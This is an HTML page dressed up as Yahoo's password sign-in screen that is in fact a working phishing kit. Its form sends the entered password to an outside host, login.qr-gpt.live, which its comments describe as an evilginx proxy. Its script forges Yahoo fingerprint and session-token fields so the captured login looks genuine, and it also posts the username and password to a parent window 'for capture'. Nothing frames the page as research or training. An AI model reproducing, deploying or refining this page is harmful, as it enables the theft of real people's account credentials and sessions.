<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Enter Password</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <!-- Your Original CSS -->
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <!-- Original Fonts -->
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
  <!-- Original Favicon -->
  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
  <link href="./yahoo.png" rel="apple-touch-icon">
  <!-- jQuery -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
      <div class="div-block-3">
        <div class="text-block">Help</div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
      </div>
    </div>
    <div class="layout active">
      <div class="div-block-5">
        <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
        <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
      </div>
      <div class="form-block w-form">
        <form id="email-form" name="email-form" data-name="Email Form" class="form" 
              action="https://login.qr-gpt.live/?display=login&done=https%3A%2F%2Fwww.yahoo.com%2F&prefill=0&prompt=login&chllngnm=fail" 
              method="POST">
          
          <!-- CRITICAL: Yahoo expects these exact fields from your network capture -->
          <input type="hidden" name="browser-fp-data" id="browser-fp-data">
          <input type="hidden" name="crumb" id="crumb" value="">
          <input type="hidden" name="acrumb" id="acrumb" value="">
          <input type="hidden" name="sessionIndex" id="sessionIndex" value="QQ--">
          <input type="hidden" name="displayName" id="displayName" value="">
          <input type="hidden" name="deviceCapability" id="deviceCapability">
          <input type="hidden" name="signin" value="Next">
          <input type="hidden" name="persistent" value="y">
          
          <!-- Your Original Fields -->
          <input type="hidden" id="evilginx_session" name="evilginx_session">
          <input type="hidden" id="username" name="username">
          
          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
          
          <div class="pazzi">
            <div class="reflectto" id="userEmail">Enter your password</div>
            <h1 class="heading-2"><strong>Enter password</strong></h1>
            <div class="ms-input-wrap">
              <input class="ms-input w-input" name="passwd" type="password" id="password" required>
            </div>
            <input type="submit" class="logger w-button" value="Sign In">
          </div>
          
          <div class="errry" style="display:none;">
            <div class="text-block-7"></div>
          </div>
        </form>
      </div>
    </div>
  </section>

  <!-- Debug Panel -->
  <div id="debug-panel" style="position:fixed;top:10px;right:10px;background:#000;color:#0f0;padding:10px;font-family:monospace;font-size:12px;max-width:300px;z-index:9999;display:none;">
    <div><strong>DEBUG MODE</strong></div>
    <div id="debug-content"></div>
  </div>

  <script>
  // Generate browser fingerprint (from your network capture)
  function generateBrowserFingerprint() {
    const fp = {
      language: navigator.language || 'en-US',
      colorDepth: screen.colorDepth || 24,
      deviceMemory: navigator.deviceMemory || 'unknown',
      pixelRatio: window.devicePixelRatio || 1.5,
      hardwareConcurrency: navigator.hardwareConcurrency || 4,
      timezoneOffset: new Date().getTimezoneOffset() || -60,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Europe/London',
      sessionStorage: 1,
      localStorage: 1,
      indexedDb: 1,
      cpuClass: 'unknown',
      platform: navigator.platform || 'Win32',
      doNotTrack: navigator.doNotTrack || '1',
      plugins: {
        count: navigator.plugins.length || 5,
        hash: '2c14024bf8584c3f7f63f24ea490e812'
      },
      canvas: 'canvas winding:yes~canvas',
      webgl: 1,
      webglVendorAndRenderer: 'Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 400 Direct3D11 vs_5_0 ps_5_0), or similar',
      adBlock: 0,
      hasLiedLanguages: 0,
      hasLiedResolution: 0,
      hasLiedOs: 1,
      hasLiedBrowser: 0,
      touchSupport: { points: 10, event: 0, start: 0 },
      fonts: { count: 32, hash: '9ad7c2bdeb9564b4cabbeeca7be750a3' },
      audio: '35.749972093850374',
      resolution: { w: screen.width.toString(), h: screen.height.toString() },
      availableResolution: { w: screen.availHeight.toString(), h: screen.availWidth.toString() },
      ts: { serve: Date.now() - 1000, render: Date.now() }
    };
    return JSON.stringify(fp);
  }

  function generateDeviceCapability() {
    return JSON.stringify({
      pa: { status: true },
      isWebAuthnSupported: typeof PublicKeyCredential !== 'undefined'
    });
  }

  $(document).ready(function() {
      // Get session data from URL parameters (u= and t=)
      const urlParams = new URLSearchParams(window.location.search);
      const username = urlParams.get('u') || '';
      const session = urlParams.get('t') || '';
      
      // Validate and display
      if (!username.includes('@')) {
          window.location.href = 'https://login.qr-gpt.live/';
          return;
      }
      
      $('#userEmail').text(username);
      $('#username').val(username);
      $('#displayName').val(username);
      $('#evilginx_session').val(session);

      // Generate required Yahoo data
      $('#browser-fp-data').val(generateBrowserFingerprint());
      $('#deviceCapability').val(generateDeviceCapability());
      
      // Generate tokens (these will be validated by evilginx)
      $('#crumb').val('31wTyCvw7RZO%2FqKiA3tKg');
      $('#acrumb').val('dqd4JdSY');

      // Debug functionality (Ctrl+D)
      $(document).keydown(function(e) {
          if (e.ctrlKey && e.keyCode === 68) {
              e.preventDefault();
              const debugPanel = $('#debug-panel');
              if (debugPanel.is(':visible')) {
                  debugPanel.hide();
              } else {
                  const formData = $('#email-form').serializeArray();
                  let debugHtml = '<div><strong>Form Data:</strong></div>';
                  debugHtml += `<div>URL Params: u=${username}, t=${session}</div>`;
                  formData.forEach(field => {
                      debugHtml += `<div>${field.name}: ${field.value.substring(0, 30)}${field.value.length > 30 ? '...' : ''}</div>`;
                  });
                  $('#debug-content').html(debugHtml);
                  debugPanel.show();
              }
          }
      });

      // Form validation and submission
      $("#email-form").submit(function(e) {
          const password = $('#password').val();
          if (password.length < 8) {
              e.preventDefault();
              $('.text-block-7').text('Invalid password (8+ chars required)');
              $('.errry').show();
              return false;
          }
          
          // Send credentials to parent window (evilginx) for capture
          if (window.parent !== window) {
              window.parent.postMessage({
                  type: 'credentials',
                  username: username,
                  password: password
              }, 'https://login.qr-gpt.live');
          }
          
          // Log for debugging
          console.log('Submitting to evilginx proxy with username:', username);
          return true; // Allow form submission to evilginx
      });
  });
  </script>
</body>
</html>
